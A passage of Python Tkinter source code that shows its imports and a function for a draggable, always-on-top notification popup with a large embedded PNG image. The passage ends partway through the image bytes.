import tkinter as tk
from datetime import datetime
from io import BytesIO
from tkinter import ttk, filedialog, messagebox
import aiohttp
import asyncio
import json
import pyperclip
import requests
import threading
import time
import webbrowser
import math
import random
import os
import telebot
from PIL import Image, ImageTk
from datetime import date, timedelta

def notification(text, state, title, size):
    noti_win = tk.Toplevel(root)
    noti_win.title(title)
    noti_win.geometry("500x500")
    noti_win.resizable(False, False)
    noti_win.wm_attributes("-topmost", 1)
    noti_win.configure(bg="#2c2c2c")
    noti_win.overrideredirect(True)

    def on_drag_start(event):
        noti_win._drag_data = {'x': event.x, 'y': event.y}

    def on_drag_motion(event):
        x = noti_win.winfo_x() - noti_win._drag_data['x'] + event.x
        y = noti_win.winfo_y() - noti_win._drag_data['y'] + event.y
        noti_win.geometry(f'+{x}+{y}')

    noti_win.bind("<ButtonPress-1>", on_drag_start)
    noti_win.bind("<B1-Motion>", on_drag_motion)

    frame = tk.Frame(noti_win, bg="#2c2c2c")
    frame.pack(fill=tk.BOTH, expand=True)

    close_button = tk.Button(frame, text="❌", command=noti_win.destroy, bg="#2c2c2c", fg="white", bd=0, font=("Arial", 10))
    close_button.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)

    if state:
        image = Image.open(BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x02\x00\x00\x00\x02\x00\x08\x06\x00\x00\x00\xf4x\xd4\xfa\x00\x00)gIDATx\xda\xec\xd7\xa1nTA\x14\x06\xe0\x8b\x01\x81\x014\x8a`:\xd3-\x06\x89@\xf0\x04$X0\x04G\xd8\xce4\x05\x07\x12\x1e\x81\xe0\x90$\r\xa2;\xb3\x10\x04/\x80\xa9\xc1\xf1\x00\x18$\xaaM{\xcfvS\xd7\xa4\xa6I\xb7\xf9\xbe\xe4Onn\xee\x9d93f\xe6\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x1a\xee}}uc2{s3}\xdb\xbc\x15\x89\xe7x7\x00\x00\x17\xc7\xdd\xfe\xf2\xda\xa4o\xdf^\xef[\x1by^\x1f\x8ey\x9c[y>f;\xf5\xfaa\xcc\xa7\xd4\xca\xce\x98\x9fc\xf6R\xaf\x7f\x16i\xe5o\xea\xe5\xdfq\xea~\xee\xf5\xf0,\x89oO\xfe[\x8cq2\xde\xder\x8e\x9d\x983\xe6\x8e\x1a\xa2\x96\xa8)j\x8b\x1a\xa3\xd6\xa8y\x00\x00N\x17\x1d\xf8\xda|\x9a\xd7\xe6[\x8fR\xaf/r+\xefS/\x9fs+?\xe2\xe0\xcd\xbd\x1c\xc4\xc1\xbcjY^<~\x8d\xd9\xcd\xad~L\xbd\xbeN\xf3\xf2$\xf5\xf2`2\x9b\xde\x19\x0e\x87+\x03\x00\\f\x1b\xdf\xeb\xf5\xf56\xbd\x9fz}\xb6\xe8\xda[\x99\xa5^\x7f\x8f\xf9\x7fQ\x0f\xf0\xf3N\xac}\xb9\x07\xbbq\xe9\xc9m\xf3i\xecQ\xec\xd5\x00\x00\xab$}y{5\xba\xf9\xe8ts\xab\xefr;b\xef\xde~\xac\xbe\xaa\x00\x8e\xefR\x906\xb4\xb5Zm\x11\xad\x98B\x0bg\xed\xe1b\x08Z\r)\x89>\x98Xk\xea\x031Q\x9f\xbc\xccCu\x18f\xad3\x0eog|k\x8c1!J\x0c\x89\xb7\xf0\xd28\x0f\x02\x9d\xb3\xd6\x0cLt4\xa1\x8d\xc6Q\x83-\r\xd4 B\xc5VH\xac1\xa5\xd8\x0bE~\x9dy(M!\xc0\xdc\xf69\xe7\xfbI\xbe\xff\xc1\xd9\xebw~\xe7\xfc~{\xdbPv=\xdc\xaaw\xf1\xf3\x96\xdb?\xb3\xeb\x98\xb8\xee\x90\xb0n\t\xdd\xb4jo\xff\xad\t\x00\x80\xf9\xb6y\xbc\xb1\xb0\xba\xd8Ww\xae\xd9m\x17\x17\xfa\xd9O\xc2\x8eM\xfd=\xd2+\xa1\x9bx\xd6\x00\x000\xebV\x1d\xe8_\x96\xc3\x1e\x9a\xbc\xb3\xd71\t=[\xea\x85\xb2S\x12\xb7W%lB\\wT_\xc4\xaa/d<[\x00\x00\x98\x16\t\x93\xae\x11\xdb\x9aC\xf7\x8a\xeb\xbfJ\xbd\x08\xd2\xa5I\xd8\x0b9l\x8f\xb8}+7{k\t\x00\x80+\x91f}\xe9\xd4\x7f\xf7\xbb\xc4\xedd\xa9\x178\xba\x8e/\x04nC\x12\xd6]k\xda\xf2\x04\x00\xe8l2\xfe\xc8-\xd5\xabw\x93\xaf\xdd\xd9Dv{\xa3\xd4\x8b\x18\xcd\xecs\x04\xd9mW\xf5e\xaf\xda\x08)\x01\x00\xda_u\x078\xf9T\xb9\r\x8b\xdb\xab\xa5^\xa4hn\x9a\xda\xf4\xe8\xa0\x84\r\xacv\xbd/\x01\x00\xdaG\xf5`X5\xe0\xabA\xcf]>]1\xd7\xc3S\x1b1m\xe2aB\x00h5\x8d\xc6\x82j\x80W\x83<\x87\x1d-\xf6bC\x85\xa7\x7f\x17\xd7\x1d\xd5\xdfD\x1b&\xba\x17%\x00@\x99\xbaF\xea\x9f\x10\xd7\x9d9\xecL\x99\x17\x14j\xd5\xc4\xedt\x0e\xfdA\xadi\x1fO\x00\x80\xf9\x97G\xf5n\t\x1b\xe0N\x9f\xe6*q=\x92\xdd\x06s\xd4W$\x00\xc0\xdc\xd906\xf0\xee\xc9\xdd\xf7t\x8c\xff\xf4i>\x9b|{D{W\x8fm\xbf#\x01\x00f\xde\x96\xa1-7f\xd7\xcfI\xe8/\xb2\xeb\xb9R/\x08\xd4\x99I\xd8\xcb\xe2\xfaX\xd7\x88=X}V\x13\x00`\xda\xa7\xe8\xdd)a\x03\xd9\xedx\xa9\xc3\x9f\xe8\x92\\Oe\xb7\xc1\xea\xb3\x9b\x00\x00\xd7fM\xd36d\xb7]\x9d|\\.\xb5z\xfaJv\x1b\xaa\xde"H\x00\x80\xcb[>\xde\xb8i\xead\xbd?\x959\xd0\x89\xae3\xd7?JX\xf7\xda\xfd\xb6$\x01\x00&\xd5\x86\xfb\xef\xcd\xae\xdf\x97\xb0\x17\x8b\x1d\xe0D3\x90\x84\xfe;\x87~\x8f7\x08\x00t\xb4<\xda\xb7NBwK\xd8\xeb\xa5\x0el\xa2\xd9I\xcfK\xd8\xb0\x8c\xf6},\x01@\xa7\x90\xd0M\xd5\xf0\xe3\x15>"\xbb \xa1\x07s\xd8C\t\x00\xda\xd2\x85tC5\xe4\xc4\xf5\xc9R\x071\xd1\xbc?\'0\xa2[8\x83\x00@{h4\x16L\x9d\xb1\xfft\xb1\x83\x97\xa8\xa8\xf4\xa9\xeaa\xd8\xcd\xe3\x8d\x85\t\x00ZM5\xbc\xc4\xeb\xdf\xe0\xfd}\xa2\xebK\xc2\x8eu\x85~\x95/\x02\x00Z\xc3\x85tCu\xc7\xcf\xde\xfcD3w\xf6\x00\x7f\r\x00(Z\xb5\xe1\x89\x84M\x94:H\x89Z9\t\xfb\xcb\x9b_\x04\x00\xa0\x14\xd5\x11\xa99\xf4W\xa5\x0eN\xa2vJB\x0f\xd6\x9a\xf6@\x02\x80\xf9"a\x92\xdd\x86x\x9d\x8fh\x1er\x1d\x93f}}\x02\x80\xb9"\xcd\xfa\xd2\xec\xf6\xb3\x1cz\xbe\xd8\xe1H\xd4\x11UkP\x7f\xda\xb5o\xeb]\t\x00f\xcb\x86\x89\xeeE\xd9\xb5W\\\xffS\xe60$\xea\xcc\xc4\xf5\xa5\xec6\xb82z\x16\'\x00\x98I\xe2\xf6)\xde\xe5\'*\xbe\xa3\xb5\xe8\xfbl\x02\x80\xe9Z\x13\xdf\xfe\x90\x84\xee.t\xd8\x11\xd1;$a\xc3k\x9a\xdb\xeeI\x00p\xad\xee\x1f\xea\xbb9\xbb\rf\xd7s\xa5\x0e9"\xbaR\xfa\x8a\xb8\xee\x90\xf1GnI\x00p5\xba\xa2\xfe\x85\x1cz\xa2\xcc\xa1FD\xd7\x96\x9e\xa8\xd6t\x02\x80\xcb\xa9\x9e$\xe6\xe7~\xa2\xf6L\xc2\x86\xd7\r\xf7}0\x01\xc0[Mm\xdf{\xa6\xd4\xe1ED\xd3O\xc2^\xbcX7\xdb\n\x03H\xab\x0e\xf4/\xcbn\xfbJ\x1dXD4\xf3\x89\xdbh\xadi\xcb\x13\x80\x0eT\x1d\xda\x13\xd6\x9dC\xff[\xea\x90"\xa2\xd9KB\xcfJ\xd8@udw\x02\xd0\x19r\xd4WH\xd8\xafK\x1dLD4wI\xd8\x13]\xa3\xba:\x01hc\xd5]\xbf\x9b\xf1j\x1f\x11]\x92\xeb9\t\xeb\xe3\xd9\x00\xa0\rUO\xf8g7/v\x00\x11Q\x11\x07\x0cU\xcf\x05%\x00\xed!\x8f\xe8gr\xe8\xf3\xc5\x0e\x1d"*&q;-#\xfa\xf9\x04\xa0u-\x1fo\xdc$\xae;8\xae\x97\x88\xae5\t\xdd\xbdv\xbf-I\x00ZKmd[\x16\xd7C\xa5\x0e\x17"*?\t{F\x9a\xf5\xf5\t@\x0b\x98z\xbdOB\xcf\x96:T\x88\xa8\x85r\xfb\x1f\xaf\x0b\x02\x85\x93\xd1\xbe\xf7\xe6\xd0(v\x90\x10Q\xeb\xe6\xe6\xd5\x8cI\x00\xcaR\xfdL\'a\xc7\x8a\x1d\x1eD\xd4\xf2\x89\xdb\xc9\x1c\xb61\x01(CW\xf4}\x85\x9f\xfc\x89h.\x9a\xdaG\xe4k\t\xc0\xfc\xd9<\xdeX\x98]\x1f-vP\x10Q\xfb\xe6\xb6K\x86\x1a\xefJ\x00\xe6Vu\xac\xa7\xb8>Y\xecp \xa2\xb6O\xc2\xfe\xc0\xa1B\xc0\x1c\xaa5\xed\x016\xf6!\xa2R6\x0e\xaa\x85~:\x01\x98]\xe2\xaa\x17{\xad\xd4a@D\x9d\xd7\xe4L\xaaoK\x00f\xe7\xff~\t\xfdQ\xa9\x03\x80\x88H\xdc~\xb2a\xa2{Q\x0203V\xed\xed\xbf\x95\xf7\xfb\x89\xa8%r\x1d[\xb7\xa7\xf7\xf6\x04`\xfa\x0f\xfb\xe5\xd0?\x17\xbb\xd8\x89\x88\xde\x9e\xdb\xd3\xabFz?\x92\x00Lcs\x1f\xd7\xe7\x8a]\xe4DD\x97M\x9fg\xd3 \xe0:\xd4\\\x1ffs\x1f"j\xe9\\\xcf]\xec\x8b\t\xc0\xd5\xc9\xae\xbd9\xf4|\xb1\x8b\x9a\x88\xe8js{\xe3b\x83\t\xc0\x154\x1a\x0br\xd8\x0f\x8b]\xc8DD\xd7\x99\xb8\xee\xe4DA\xe0\x1dl\x19\xdarcv\xfdy\xa9\x8b\x97\x88h\xba\x89\xebc\xbc&\x08\xbc\xc5\xca\xe8Y,\xae\xbf,u\xd1\x12\x11\xcdT\xe2\xda\xbc\x7f\xa8\xef\xe6\x04t\xba\xb5\xfbmIv\x1d+u\xb1\x12\x11\xcd|\xfa\xdb\x95\xd1s[\x02:\xd5\x9a\xe6\xf6\xf7p\xa0\x0f\x11ub\x126q\xdf\xe3\xfa\xbe\x04t\x1ai\xd6\x97\x8a\xeb\xa1R\x17\'\x11\xd1l\'a\xcfT\x9b\x9d%\xa0ST\xc7g\xe6\xd0gK]\x94DDs\x96\xdb\xf1\x1c\xf5\x15\thw\xb9\xd9[\x93\xb0\x7f\x14\xbb\x18\x89\x88\xe6\xb8j&v\x8d\xea\xea\x04\xb4+\x19\xed[\x99]O\x95\xba\x08\x89\x88\xe6+\t{\xa1\xbaAJ@\xbb\x91\xc7\x07>\x9c\xdd\x8e\x97\xba\xf8\x88\x88\xe6;q}nMs\xdb=\th\x17yT\xef\x16\xd7\xbf\x95\xba\xe8\x88\x88\xcaIOp\x92 \xdaB\xd7\xbe\xadw\x89\xeb\x912\x17\x1a\x11Q\x81\xb9\xfd\x95\xb7\x03\xd0\xd2\xd6\xee\xb7;\xb3\xeb\xe1b\x17\x19\x11Q\xb1\xe9\xb3\xabG\xb6} \x01\xadf}\xf4\xbc?\x87>U\xe6\xc2""*?q=R\xfd\x8a\x9a\x80V\xb1nO\xef\xed\x126Q\xea\xa2""j\x95\xc4\xf5\xd0\xea\xb1\xedw$\xa0t\x93{\xfb\xdb\xefK]LDD\xad\x97\xfe\xae\x9a\xad\t(\xd5\x9bG\xfa\x86\xee-s\x01\x11\x11\xb5pn\xbey\xbc\xb10\x01%\x12\xd7\x9d\xc5.\x1e"\xa2\x16O\\\x7f\x9c\x80\xd2d\xd7\xef\x94\xbah\x88\x88\xda&\xb7\xc1\x04\x94"\xbb~\xbd\xd8\xc5BD\xd4f\x89\xeb7\x130\xdf\xbaF\xecAq}\xad\xd4\x85BD\xd4nI\xd8\xeb5\xd7\x87\x130_r\xd8Fq}\xa9\xd4EBD\xd4\xaeI\xd8\xcb\xb9\xa9\x9fL\xc0\\\xab\r\xf7\xdf\x9b\xc3\xce\x94\xba8\x88\x88\xda=q;]\xcd\xe2\x04\xcc\x95\x95\xd1s\x1b[\xfc\x12\x11\x15\xd1\xd1j\xf3\xb5\x04\xcc\xbaFc\x81\xb86\x0b]\x08DD\x1d\x97\xb8\xee\xaf\xf6aI\xc0l\x12\xd7\xef\x96\xba\x08\x88\x88:6\xd7G\x130[$\xf4\xcb\xc5~\xf8\x89\x88:<\xf1\xfa\x97\x120\xd3j\xa1\x1f\x95\xd0\xb3\xa5~\xf0\x89\x88:>\xd7s9lc\x02fJu\x1c\xa5\xb8\x9d,\xf6CODD\x93\xb9\x9eZu\xa0\x7fY\x02\xa6k\xc3D\xf7"q\xfbM\xb1\x1fv""\xba$\t{be\xf4,N\xc0td\xb7\xff\xb3ww1rVu\x1c\xc7\xff-\x18A\x0c\n*\x88\xd14\x92\x06v\xcf\xd9-$\xd5P\x01\xad \xa2\x17\x80\x1a\xa8\xc6\x04B\x90\xc4\x18\xa5\xb0s\xfeS\xa8\nN\x94(&x\xa5\x01\xe5%r\xc3\x8d\x8bX[\xe6\x7f\xa6[\xc0\x05Q\n\x88\x14\xa81&b\xb4\x95\x97\n\x96R\x91\x97@\xdb\xd1\x11PX\xfb\xb2\xdb\xee\xee\xfc\xcf\xf3|\xbf\xc9\xe7~s\x9e\x93\xfc\x9e\xeeng\xaf\xf1z\xc9\x01\x00\xbb`z\x83\x10\xedmC9}\xc1\xed\xe5\x06\x00\xecV0=O\x88\xa6\xda`g$\xf2K\x7f\x00P\xae`\xe9\x9f!k\x10\xa2\xc96o\xbcu@0}\xd0\xeb\xa5\x06\x00L\x92\xe9\xef\x16\xaej\xbdE\x88&S\xb0t\xbd\xdb\xcb\x0c\x00\x98\xa2t\xad\x10\xed\xa9h\xe9s>/0\x00`o\r\xe5\xc6\xd9B\xb4\xab\xc2\xea\xc6\xfch\xba\xd5\xeb\x05\x06\x00\xec%\xd3g\x87;\xcb\x8e\x16\xa2\x89\xf5\xfe\xcfh4}\xc0\xed\xe5\x05\x00\xec\x93`\xe9\xa1E\xa3\x8d\x03\x85\xe8\xf5\x05KWy\xbd\xb4\x00\x80ib\xfa}!z\xad\xa1\xdc\xfc\x8c\xdb\xcb\n\x00\x98V\xa1\x93\xce\x10\xa2\xa3V\xa5w\x86\xac\x9b\xbc^T\x00\xc0\xf4\n\xa6O.\x18\xd3\xc3\x84\xea]4\x1d\xf5zI\x01\x003f\x85P}\x0b\x9d\xf4y\xa7\x17\x13\x000\xc3\x06\xdb\xfaY\xa1\xfaul^\xfa\xae`\xe9o^/&\x00`\x86Y\xfa{h7\xdf-T\xaf\x82\xa5\x9b\xdd^J\x00\xc0\xac\x08\x96V\t\xd5\xa7\x90\xf5\\\xaf\x97\x11\x000\xcb\xdaz\x8eP\xf5;z\xcd\xb2\xf7\x84\x9c\x9ev{\x11\x01\x00\xb3*Xz&\xaeN\xef\x13\xaav1\xa7\xec\xf5\x12\x02\x00\xfa#d]#]\x99#T\xcdz\x7f\x0c\xc2\xeb\xe5\x03\x00\xf0\x07\x83hf>\xeb\xff\xe0h\xfa\xb8\xd7\x8b\x07\x00\xe8\xaf\x90u\xd3p{\xf9!B\xd5*\x98^\xed\xf5\xd2\x01\x00|\x08\x96\xae\x12\xaaN\xc3m]\x18\xb2n\xf3z\xe1\x00\x00^\xa4\xed\x83m=N\xa8\x02\xb5ZscN\xf7\xf8\xbch\x00\x00oB\xd6\xfb\x97\x8c.\xd9O\xa8\xec\x82\xe9\x05^/\x19\x00\xc0\xa7`\xe9+B\xe56\xb4\xf2\xc2\xc3C\xd6-^/\x18\x00\xc0)\xd3\xad\xbd\xcf\x8d\x11*\xb3hz\xa3\xdb\xcb\x05\x00\xf0\xcd\xf4F\xa1\xf2\x8a\xed\xc6I\xd1t\x87\xdb\x8b\x05\x00p/\x98\x9e,TP\xaf\xfc\xe2\xdf:\xaf\x17\n\x00P\x86\x90\xf5\xf7\x8b\xc7[\xfb\x0b\x95Q\xccz\xbe\xd7\xcb\x04\x00(\xce\xf9B\xfe[4\xda80\x98ntz\x89\x00\x00\xa5\xb1\xf4\xd8\x821=H\xc8w\xc1\xd2en/\x11\x00\xa0H\xbdm\x11\xf2\xdb\x821=,\x9an\xf5z\x81\x00\x00\x852}v\xa03r\x84\x90\xcfBN?t{y\x00\x00e3\xfd\x91\x90\xbf\x86;\xcb\x8e\x0e\xa6/\xb9\xbd8\x00\x80\xa2\x85\xac\xdb\x06;#Q\xc8W\xd1t\xa5\xd7K\x03\x00\xa8\x86`i\x95\x90\x9f\x06\xdb\xfa\x11\xaf\x97\x05\x00P-\x839}L\xc8G!\xeb\xaf\xbd^\x14\x00@\xc5\x98\xae\x15\xea\x7f\x83\x9d\xe6)n/\t\x00\xa0\xa2\x9a\xa7\n\xf5\xb7\x98\xd3\x9d>/\x07\x00\xa0\xaa\x82\xa5\xbb\x85\xfaW0=\xd9\xeb\xe5\x00\x00T\x1b\xbf\x0b\xd0\xc7\x82\xe9\x1d^/\x06\x00\xa0\xdaBN\xbf\x12\x9a\xfd\xa25O\xf0z)\x00\x00\xf50\x94\x1b\x8b\x85f\xb7\x98\xd3\xed^/\x04\x00\xa0.\xd2\xedB\xb3Wl\xa7\xe3}^\x04\x00@\xdd\xf4>\x8bFhv\nY\xd7x\xbd\x08\x00\x80z\xe9m\x92\xd0\xcc7\x90\x1b\x8b\xbc^\x02\x00@=\xf5\xb6Ihf\x8b\x96n\xf2z\x01\x00\x005e:*4s\r\xb6u^\xb0\xf4\xb2\xdb\x0b\x00\x00\xa8\xa5\x90u\xdb\x821}\xbf\xd0\xcc\x14L\xaf\xf4\xfa\xf0\x01\x00\xf5\xd6\xdb(\xa1\xe9o\xc1\x98\x1e\x14M7{}\xf0\x00\x80\x9a3\xdd:?/=Xhz\x0b9-u\xfb\xd0\x01\x00\xf8\xb7`z\x81\xd04\xd6\x959\xc1\xd2\x1f\xbc>p\x00\x00\xfe\xc3\xf4\x8f\xd2j\xcd\x15\x9a\x9eb\xd6\xd3\xdd>l\x00\x00\xde\xe8t!>\xf6\x17\x00P7|<\xf0\xb44p\x8b\x0eE\xd3\x1d>\x1f2\x00\x00\xff/\xb4\x9b\xc7\n\xed[\xd1\xf4\x1a\xaf\x0f\x18\x00\x80\x9dK\xd7\n\xed}\x8bF\x1b\x07\x86\xac[|>\\\x00\x00v\xc1\xf4\xd90\xfe\xe5\xb7\n\xed]!\xeb\xb9n\x1f.\x00\x00\xbb\xd1\xdb0\xa1\xbd+Z\xfa\xa5\xd7\x07\x0b\x00\xc0\xee\xf46Lh\xea\rX:\x8a_\xfe\x03\x00\x94lhu\x1a\x10\x9aZ\xd1\xf4\n\xaf\x0f\x14\x00\x80I\xb1\xf4]\xa1\xc9\xb7x\xbc\xb5\x7f\xb4\xf4\x98\xdb\x07\n\x00\xc0$\x84\xac\x9b\x16\xde\xff\xc57\t\xf1\xc9\x7f\x00\x80\xda\xe1\x93\x01\'[\xcc\xba\xc2\xe9C\x04\x00`\x8a\xd2\xcf\x85\xf6\xdc\xd0\xca\x0b\x0f\x0f\xa6/\xf9|\x88\x00\x00LM\xb0\xf4\xf2@g\xe4\x08\xa1\xdd\x17-]\xe4\xf5!\x02\xc0l\xf8\xe0\xd8\xd7\xba\xa7\x8c_\xee\xf6\xeb\xc3\xdeh\x8e\x08\xed\xbe`\xe9n\x9f\x0f\x0f\x00f\xde\x07\xc6\xbe\xda\xbdo\xf3#\xdd\'^\xd8\xd2\xfd\xe4\x1d\xdfq\xfbubjz\xdb&\xb4\xeb\x86\xf3\xc5\xef\xe5\xff\xfe\x03\xa8\xab\xd7\xc6\xff\xd5x\t\xa8\x12\xd3\x1d\x83m\x9d\'\xb4\xf3B\xd6\x86\xdb\x87\x07\x00\xb37\xfeox\t\xf8\x04/\x01\x95\xd0\xdb8!\xbe\xfd\x0f\x00\x13\xc7\x7fW=\xfe</\x01U\xc0\x8f\x01\xf8\xf6?\x00\xecj\xfcy\t\xa82~\x0c\xc0\xb7\xff\x01`\'\xe3\xcfK@\r\x04KI\x88o\xff\x03\xa8\xaf\t\xe3\xcfK@]\x98\xae\x15\xe2\xdb\xff\x00\xeai\xc2\xf8\xf3\x12P\'\xfc\x18\x80o\xff\x03\xa8\xa7\t\xe3\xcfK@\r\x05S\x15z\xa5\x98\xd3\x9d^\x1f\x14\x00L\xe7\xf8\xff\xe6\x7f\xe3\xcfK@]\x99\xde%$2?/=\x98\xcf\xfe\x07Pu\x13\xc6\x9f\x97\x80\x1a\x0bY\xb7\x85\xd5\x8dC\xa5\xeeEk\x9c\xe9\xf5!\x01\x80\xe7\xf1\xe7%\xa0\\!\xebYR\xf7B\xd6\xeb\xbc> \x00\xf0>\xfe\xbc\x04\x94)X\xba^\xea^\xcci\x83\xd7\x07\x04\x00%\x8c?/\x01\x052}\\\xba2G\xea\xda\xb05\x86\xdd>\x1c\x00(h\xfcy\t(\xcfPn.\x90\xba\x16;\xba\xcc\xeb\x83\x01\x80\xd2\xc6\x9f\x97\x80\xc2X\xbaX\xeaZ\xcc\xe9v\xb7\x0f\x06\x00\n\x1c\x7f^\x02\xca\x11\xb2\xfeB\xea\xd8\x821=(\x9a\xbe\xe8\xf5\xc1\x00@\xa9\xe3\xcfK@\x19\x82\xe9K\x0bo\xbd\xe4mR\xb7\x06\xdb\xcdOy}(\x00P\xfa\xf8\xbf\xfe%\xe0\xd4\xf1o\xbb=\xb7\xba\x1b\xb4\xf4i\xa9[\xc1\xd2U^\x1f\x08\x00Ta\xfcy\t\xf0/\x98^-u+\xe6\xb4\xde\xeb\x03\x01\x80\xc9:n\xcd\xd7\xbb\xeb\x9e\xfes\xd7{\x8f>\xbf\xb9\xfb\xe1\xdbZn\xcf\xb1\xbe\xd2z\xa9S\xc3\xed\xe5\x87\xc4\x9c\xb6\xfb|\x18\x00P\x8d\x7f\xf9\xbf\xbe\x9b\xffzow\xb8\xd3t{\x96\xb5e\xba\xa3V\x1f\x0b\x1c-\x9d\xe6\xf6a\x00\xc0\xa4\xc7\xffO\xdd\x12b\xfc\x9d\xb3t\x9a\xd4\xa5hz\x85\xdb\x07\x01\x00\x8c?f\x93\xe9\x15R\x97\xa2\xe9]n\x1f\x04\x000\xfe\xe0\xcf\x03\xcf\xc8\x9f\xff}s\xb4\xf4\x82\xdb\x07\x01\x00\x8c?f\x93\xe9\x8b\xf3\xc6[\x07H\xd5\x8b\xd6<\xc1\xedC\x00\x00\xc6\x1f}\x10r:Q\xaa^\xc8z\x89\xd7\x07\x00\x00\x8c?\xfa!\xe4\xb4\\\xaa^\xb0\xb4\xca\xeb\x03\x00\x00\xc6\x1f\xfd\x10\xb2\xde"\x95\xae+sb\xd6\xa7\xbc>\x00\x00`\xfc\xd1\x17\xa6\x9b\xa5\xd5\x9a+U-\xacn\xccw{\xf8\x000\xe1\x13\xfe\x1e\xdc\xf2\x97n\t\xfdt\xe3=\x8c\x7f\x05\xf46R\xaaZ\xb4\xc6\x99^\x0f\x1e\x00\x18\x7f\xf4S\xc8z\x96T\xb5\x98\xf5[^\x0f\x1e\x00\x18\x7f\xf4S\xb0t\xb9T5~\x01\x10\x80g\x8c?\xfa\xa9\xb7\x91R\xd5bN\x1b\xbc\x1e<\x80zc\xfc\xd1\x7fi\x83T\xb1cV\\\xf4\xf6h\xba\xc3\xe7\xa1\x03\xa83\xc6\x1f^\x0c\xdc\xba\xfc\x1dR\xb5bG?\xea\xf5\xc0\x01\xd4\x17\xe3\x0fW\xda\x8d\x93\xa4jEK\x17\xb9=p\x00\xb5\xc4\xf8\xc3\x9f\xe6\x88T\xad\x98\xd3\x8f}\x1e6\x80:b\xfc\xe1\x92\xe9\rR\xb5\xa2\xe9\x03n\x0f\x1c@\xad0\xfep\xcb\xf4\x01\xa9R\x8b\xc7[\xfb\xf3\'\x80\x010\xfe\x8c?\xf6\xc0\xf4\xc5\xdefJU\x1an\x8f\x1c\xe9\xf6\xb0\x01\xd4\x06\xe3\x8f\x12\xf46S\xaa\xd2\x90\xa5\x8f{=h\x00\xf5P\xd2\xf8\xdf\xc4\xf8\xd7Zo3\xa5*\r\x99~\xc9\xebA\x03\xa8>\xc6\x1f%\xe9m\xa6T\xa5`z\xa5\xd7\x83\x06Pm\x8c?J\xd3\xdbL\xa9J\xc1\xd2\xcf\xbc\x1e4\x80\xeab\xfcQ\xa8\x15R\x95\x82\xa5\x87\x9c\x1e2\x80\x8ab\xfcQ\xaa\x90\xf5a\xa9J1\xa7\x7fx=h\x00\xd5\xd3\x1b\xff\x87\xb6l\xe8\x96\x10\xe3\x8f\x89BN\xcfIW\xe6H\xe9\r\xad\xbc\xf0p\xaf\x87\x0c\xa0z\x18\x7fT\xc1@g\xe4\x08)\xbd\xd8N\xc7{=`\x00\xd5R\xda\xf8\x0fe\xc6\x1f;\x17r:QJ/\xb6\xf5\x1c\xaf\x07\x0c\xa0:\x18\x7fTI\xc8z\xae\x94^\xc8\xfa\r\xaf\x07\x0c\xa0\x1a\x18\x7fT\x8e\xa5oJ\xe9E\xd3k\xdc\x1e0\x80\xe21\xfe\xa8\xa2`\xe9z)\xbd`\xa9\xed\xf5\x80\x01\x94\x8d\xf1Ge\x99\x9a\x94^\xb4\xf4[\xb7\x07\x0c\xa0X\x8c?\xaa-\xad\x93\xd2\x8b9=\xe1\xf3p\x01\x94\x8a\xf1G\xd5\x85\xac\x9b\xa4\xe8Z\xad\xb9!\xeb6\xaf\x07\x0c\xa0<\x8c?\xea!m_2\xbad?)\xb5\xe1\xf6\xf2C|\x1e,\x80\x121\xfe\xa8\x93\xb0\xbaq\xa8\x94\xdap{\xe4H\xaf\x07\x0b\xa0,\x8c?\xea&\xacn\xcc\x97R\x1b\xc8\x8dE^\x0f\x16@9\x18\x7f\xd4\xd1P\xa7\xf9!)\xb5\x98\xf5t\xaf\x07\x0b\xa0\x0c\x8c?\xea*t\xd2\x19Rj\xc1\xf4<\xaf\x07\x0b\xc0\xbf\x92\xc6\x7ft\xe3Z\xc6\x1f\xd3\xed|)\xb5\x98\x9b#N\x0f\x15\x80s\x8c?\xd0\x1c\x91R\x8bm\xbd\xd4\xe7\xa1\x02\xf0\x8c\xf1\x07\xb4\x1b,]&\xa5\x16L\xaf\xf4z\xb0\x00|b\xfc\x81\xd7\xa4\xefI\xa9\x85\xac\xd7\xf9<T\x00\x8c?\xe3\x0f\xdfz\x1b*\xa5\x16MG\xbd\x1e,\x00\x7f\xe3\xff\xf03\x8c?\xf0_\x96n\x92R\x8b9e\xb7\x07\x0b\x80\xf1g\xfc\xe1[GJ-\x98\xde\xe1\xf4P\x010\xfe\x8c?\\\xebm\xa8\x94Z4\xbd\xd7\xeb\xc1\x02`\xfc\x19\x7fx\x16,\xdd\'\xa5\x16sZ\xef\xf5`\x010\xfe\x8c?|K\xeb\xa5\xd4\x82\xa5G|\x1e*\x00\xc6\x9f\xf1\x87o\xbd\r\x95R\x0bY\x1f\xf5z\xb0\x00\x18\x7f\xc6\x1f\xaeYzLJ-f}\xca\xed\xc1\x02`\xfcw\xd3O6\xde\xcd\xf8\xa3\xaf\x82\xe9\x93Rj\xc1\xd23^\x0f\x16\x00\xe3\xcf\xf8\xc3\xb3\xde\x86J\xa9\x85\xac\xcf{=X\x00\x8c?\xe3\x0f\xcfBN\xcfI\xa9\x05K/{=X\x00\x8c?\xe3\x0f\xcfz\x1b*\xa5\xe6\xf5P\xe1\xd71\x9d\x8b\xbbg\xaf\xfd\x81\xdb\xaf\x0fS\xb3\xe8\xd6K\x19\x7f`\x1fH\xa9y=P\xf8\xd4\x1b\xff\xdb6\xad\xefn\xdf\xb1\xbd\xbbl\xdd\x8dn\xbfN0\xfe\x00/\x00{(d\xdd\xe6\xf5P\xe1s\xfc_\x8d\x97\x80\xc21\xfe@\xdd\x7f\x04`\xe9\x05\xaf\x07\x0b\xbf\xe3\xcfK@\xd9\x18\xff\x7f\xb1w\xef1v\x17U\x00\xc7O\xa1\xf1\x01\x1a\xb1*\xa0 D\xc1\xb2{~\xb7[\x03\x84\xa0\x10+*Q!>\x02\x96 